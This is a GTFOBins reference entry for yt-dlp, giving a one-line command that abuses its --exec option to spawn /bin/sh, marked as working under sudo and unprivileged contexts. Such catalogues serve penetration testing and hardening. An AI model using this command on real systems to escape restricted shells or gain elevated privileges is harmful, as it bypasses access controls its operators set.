<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/yt-dlp -->
---
functions:
  shell:
  - code: |-
      yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
    comment: |-
      The URL must point to a valid YouTube video which will be actually downloaded.
    contexts:
      sudo:
      unprivileged:
...
